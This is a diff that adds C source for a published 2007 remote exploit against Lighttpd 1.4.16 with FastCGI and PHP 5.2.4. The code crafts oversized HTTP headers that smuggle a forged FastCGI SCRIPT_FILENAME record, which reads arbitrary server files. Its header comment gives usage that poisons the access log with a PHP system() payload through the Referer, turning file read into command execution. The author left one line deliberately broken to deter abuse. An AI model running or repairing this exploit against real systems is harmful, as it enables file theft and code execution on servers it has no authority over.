@@ -1,0 +1,144 @@
+/*
+ * Remote Lighttpd + FastCGI + PHP example exploit
+ *
+ * Tested with Lighttpd 1.4.16 and PHP 5.2.4
+ *
+ * To avoid abuse there's a "remove me" in the code.
+ *
+ * Example:
+ *
+ * # ./exploit localhost 80 /etc/passwd
+ *
+ * or
+ *
+ * # wget --referer="<?php system('/usr/bin/id'); ?>" localhost
+ * # ./exploit localhost 80 /var/log/lighttpd/access.log 
+ *
+ * 
+ * Mattias Bengtsson <mattias@secweb.se>
+ *
+ * http://www.secweb.se/
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+
+int append_header(char *p, int c, int a, int b)
+{
+	c = 0x41 + (c % 25);
+
+	memset(p, c, a + b + 4);
+
+	p[a + 0 + 0] = ':';
+	p[a + 0 + 1] = ' ';
+	p[a + b + 2] = '\r';
+	p[a + b + 3] = '\n';
+
+	return a + b + 4; 
+}
+
+int network(const char *host, int port)
+{
+	struct sockaddr_in addr;
+	struct hostent *he;
+	int sock;
+
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+
+	addr.sin_family = AF_INET;
+
+	if((he = gethostbyname(host)) == NULL)
+		return 0;
+
+	memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
+
+	addr.sin_port = htons(port);
+
+	connect(sock, (struct sockaddr *)&addr, sizeof(addr));
+
+	return sock;
+}
+
+int main(int argc, char **argv)
+{
+	char *b, *p;
+	int sock, i;
+	char tmp[1024];
+
+	if(argc < 4) {
+		fprintf(stderr, "Usage: %s <host> <port> <file>\n", argv[0]);
+		exit(0);
+	}
+
+	sock = network(argv[1], atoi(argv[2]));
+
+	if(sock <= 0) {
+		fprintf(stderr, "Host down?\n");
+		exit(0);
+	}
+	
+	b = p = malloc(0xffff + 0xffff);
+
+	p += sprintf(p, "GET /index.php HTTP/1.1\r\n");
+	p += sprintf(p, "Host: %s\r\n", argv[1]);
+	p += sprintf(p, "A: A\r\nB: ");
+
+	*p++ = 128;
+	*p++ = 0x00;
+	*p++ = 0x54;
+	*p++ = 0x42;
+	*p++ = '\r';
+	*p++ = '\n';
+	p = 0x00;
+	
+	p += append_header(p, 0, 4, 1);
+	p += append_header(p, 1, 200 , 25079);
+
+	p -= 3631;
+
+	*p++ = 1; // Version
+	*p++ = 4; // Type
+	*p++ = 0;
+	*p++ = 0;
+
+	i = sprintf(tmp, "SCRIPT_FILENAME");
+	sprintf(tmp + i, "%s", argv[3]);
+
+	*p++ = 0x00; // Length 
+	*p++ = 2 + strlen(tmp); // Length
+	*p++ = 0x00; // Padding
+	*p++ = 0x10;
+	*p++ = i; // name_len
+	*p++ = strlen(tmp) - i; // var_len
+
+	memcpy(p, tmp, strlen(tmp));
+
+	p += 3631 - 8 - 2;
+
+	p += append_header(p, 2, 200, 40007);
+	p += sprintf(p, "\r\n\r\n");
+
+	write(sock, b, (p - b));
+
+	i = read(sock, b, 0xffff);
+	*(b + i) = 0;
+	
+	printf("%s\n", b);
+
+	free(b);
+	close(sock);
+
+	return 0;
+}
+
+// milw0rm.com [2007-09-10]
